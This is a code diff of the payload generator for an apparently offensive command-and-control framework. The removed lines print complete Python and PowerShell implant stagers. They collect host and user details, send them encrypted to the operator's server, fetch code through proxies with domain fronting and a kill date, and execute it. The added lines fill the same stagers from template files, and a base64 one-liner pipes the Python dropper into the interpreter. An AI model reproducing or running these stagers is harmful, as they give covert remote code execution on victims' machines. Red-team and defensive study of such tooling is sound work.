@@ -26,6 +26,8 @@ class Payloads(object):
     self.Referer = Referer
     self.ConnectURL = ConnectURL
     self.BaseDirectory = BaseDirectory
+    self.C2Core = ""
+    self.Python = ""
     if os.path.exists("%saes.py" % PayloadsDirectory):
       with open("%saes.py" % PayloadsDirectory, 'rb') as f:
         content = f.read()
@@ -45,117 +47,17 @@ class Payloads(object):
       output_file.write(aespy)
       output_file.close()
       self.PythonHash = hashlib.sha512(aespy).hexdigest()
-    self.Python = """import urllib2,os,sys,base64,ssl,socket,pwd,hashlib,time
-kd=time.strptime("%s","%%d/%%m/%%Y")
-pyhash="%s"
-pykey="%s"
-key="%s"
-serverclean="%s"
-url="%s"
-url2="%s"
-hh="%s"
-ua="%s"
-cstr=time.strftime("%%d/%%m/%%Y",time.gmtime());cstr=time.strptime(cstr,"%%d/%%m/%%Y")
-ssl._create_default_https_context=ssl._create_unverified_context
-if hh: r=urllib2.Request(url,headers={'Host':hh,'User-agent':ua})
-else: r=urllib2.Request(url,headers={'User-agent':ua})
-res=urllib2.urlopen(r);d=res.read();c=d[1:];b=c.decode("hex")
-s=hashlib.sha512(b)
-if pykey in b and pyhash == s.hexdigest() and cstr < kd: exec(b)
-else: sys.exit(0)
-un=pwd.getpwuid( os.getuid() )[ 0 ];pid=os.getpid()
-is64=sys.maxsize > 2**32;arch=('x64' if is64 == True else 'x86')
-hn=socket.gethostname();o=urllib2.build_opener()
-encsid=encrypt(key, '%%s;%%s;%%s;%%s;%%s;%%s' %% (un,hn,hn,arch,pid,serverclean))
-if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
-else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
-res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\\0');exec(x)
-    """ % (self.KillDate,self.PythonHash,self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport),(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.DomainFrontHeader,self.UserAgent)
-    self.C2Core = """%s
-$sc="%s"
-$s="%s"
-function CAM ($key,$IV){
-try {$a = New-Object "System.Security.Cryptography.RijndaelManaged"
-} catch {$a = New-Object "System.Security.Cryptography.AesCryptoServiceProvider"}
-$a.Mode = [System.Security.Cryptography.CipherMode]::CBC
-$a.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
-$a.BlockSize = 128
-$a.KeySize = 256
-if ($IV)
-{
-if ($IV.getType().Name -eq "String")
-{$a.IV = [System.Convert]::FromBase64String($IV)}
-else
-{$a.IV = $IV}
-}
-if ($key)
-{
-if ($key.getType().Name -eq "String")
-{$a.Key = [System.Convert]::FromBase64String($key)}
-else
-{$a.Key = $key}
-}
-$a}
-function ENC ($key,$un){
-$b = [System.Text.Encoding]::UTF8.GetBytes($un)
-$a = CAM $key
-$e = $a.CreateEncryptor()
-$f = $e.TransformFinalBlock($b, 0, $b.Length)
-[byte[]] $p = $a.IV + $f
-[System.Convert]::ToBase64String($p)
-}
-function DEC ($key,$enc){
-$b = [System.Convert]::FromBase64String($enc)
-$IV = $b[0..15]
-$a = CAM $key $IV
-$d = $a.CreateDecryptor()
-$u = $d.TransformFinalBlock($b, 16, $b.Length - 16)
-[System.Text.Encoding]::UTF8.GetString($u)}
-function Get-Webclient ($Cookie) {
-$d = (Get-Date -Format "dd/MM/yyyy");
-$d = [datetime]::ParseExact($d,"dd/MM/yyyy",$null);
-$k = [datetime]::ParseExact("%s","dd/MM/yyyy",$null);
-if ($k -lt $d) {exit}
-$username = "%s"
-$password = "%s"
-$proxyurl = "%s"
-$wc = New-Object System.Net.WebClient;
-%s
-$h="%s"
-if ($h -and (($psversiontable.CLRVersion.Major -gt 2))) {$wc.Headers.Add("Host",$h)}
-elseif($h){$script:s="https://$($h)%s";$script:sc="https://$($h)"}
-$wc.Headers.Add("User-Agent","%s")
-$wc.Headers.Add("Referer","%s")
-if ($proxyurl) {
-$wp = New-Object System.Net.WebProxy($proxyurl,$true);
-if ($username -and $password) {
-$PSS = ConvertTo-SecureString $password -AsPlainText -Force;
-$getcreds = new-object system.management.automation.PSCredential $username,$PSS;
-$wp.Credentials = $getcreds;
-} else { $wc.UseDefaultCredentials = $true; }
-$wc.Proxy = $wp; } else {
-$wc.UseDefaultCredentials = $true;
-$wc.Proxy.Credentials = $wc.Credentials;
-} if ($cookie) { $wc.Headers.Add([System.Net.HttpRequestHeader]::Cookie, "SessionID=$Cookie") }
-$wc }
-function primer {
-try{$u=([Security.Principal.WindowsIdentity]::GetCurrent()).name} catch{if ($env:username -eq "$($env:computername)$"){}else{$u=$env:username}}
-$o="$env:userdomain;$u;$env:computername;$env:PROCESSOR_ARCHITECTURE;$pid;%s"
-try {$pp=enc -key %s -un $o} catch {$pp="ERROR"}
-$primer = (Get-Webclient -Cookie $pp).downloadstring($s)
-$p = dec -key %s -enc $primer
-if ($p -like "*key*") {$p| iex}
-}
-try {primer} catch {}
-Start-Sleep 300
-try {primer} catch {}
-Start-Sleep 600
-try {primer} catch {}""" % (self.Insecure,(self.HostnameIP+":"+self.Serverport),
-  (self.HostnameIP+":"+self.Serverport+self.ConnectURL+self.ImplantType),self.KillDate, self.Proxyuser,self.Proxypass,
-  self.Proxyurl,self.Proxy,self.DomainFrontHeader,self.ConnectURL,self.UserAgent,self.Referer,
-  (self.HostnameIP+":"+self.Serverport),self.Key,self.Key)
 
-
+    cs = content.replace("#REPLACEKILLDATE#",self.KillDate)
+    cs1 = cs.replace("#REPLACEPYTHONHASH#",self.PythonHash)
+    cs2 = cs1.replace("#REPLACESPYTHONKEY#",self.PythonKey)
+    cs3 = cs2.replace("#REPLACEKEY#",self.Key)
+    cs4 = cs3.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
+    cs5 = cs4.replace("#REPLACEQUICKCOMMAND#",(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"))
+    cs6 = cs5.replace("#REPLACECONNECTURL#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"))
+    cs7 = cs6.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
+    cs8 = cs7.replace("#REPLACEUSERAGENT#",self.UserAgent)
+     
   def QuickstartLog( self, txt ):
     if not self.quickstart: self.quickstart = ''
     print txt
@@ -180,6 +82,23 @@ try {primer} catch {}""" % (self.Insecure,(self.HostnameIP+":"+self.Serverport),
       return base64.b64encode(b64gzip.encode('UTF-16LE'))
 
   def CreateRaw(self, name=""):
+    with open("%sdropper.ps1" % FilesDirectory, 'rb') as f:
+     content = f.read()
+
+    cs = content.replace("#REPLACEINSECURE#",self.Insecure)
+    cs1 = cs.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
+    cs2 = cs1.replace("#REPLACEIMPTYPE#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+self.ImplantType))
+    cs3 = cs2.replace("#REPLACEKILLDATE#",self.KillDate) 
+    cs4 = cs3.replace("#REPLACEPROXYUSER#",self.Proxyuser)
+    cs5 = cs4.replace("#REPLACEPROXYPASS#",self.Proxypass)
+    cs6 = cs5.replace("#REPLACEPROXYURL#",self.Proxyurl)
+    cs7 = cs6.replace("#REPLACEPROXY#",self.Proxy)
+    cs8 = cs7.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
+    cs9 = cs8.replace("#REPLACECONNECT#",self.ConnectURL)
+    cs10 = cs9.replace("#REPLACEUSERAGENT#",self.UserAgent)
+    cs11 = cs10.replace("#REPLACEREFERER#",self.Referer)
+    self.C2Core = cs11.replace("#REPLACEKEY#",self.Key)
+    
     out = StringIO.StringIO()
     with gzip.GzipFile(fileobj=out, mode="w") as f:
       f.write((self.C2Core))
@@ -419,6 +338,18 @@ ao.run('%s', 0);window.close();
   def CreatePython(self, name=""):
     self.QuickstartLog( ""+Colours.END )
     self.QuickstartLog( "OSX/Unix Python Payload:"+Colours.GREEN )
+    with open("%sdropper.py" % FilesDirectory, 'rb') as f:
+      content = f.read()
+    cs = content.replace("#REPLACEKILLDATE#",self.KillDate)
+    cs1 = cs.replace("#REPLACEPYTHONHASH#",self.PythonHash)
+    cs2 = cs1.replace("#REPLACESPYTHONKEY#",self.PythonKey)
+    cs3 = cs2.replace("#REPLACEKEY#",self.Key)
+    cs4 = cs3.replace("#REPLACEHOSTPORT#",(self.HostnameIP+":"+self.Serverport))
+    cs5 = cs4.replace("#REPLACEQUICKCOMMAND#",(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"))
+    cs6 = cs5.replace("#REPLACECONNECTURL#",(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"))
+    cs7 = cs6.replace("#REPLACEDOMAINFRONT#",self.DomainFrontHeader)
+    self.Python = cs7.replace("#REPLACEUSERAGENT#",self.UserAgent)
+
     py = base64.b64encode(self.Python)
     #print self.Python
     pydropper_bash = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % py
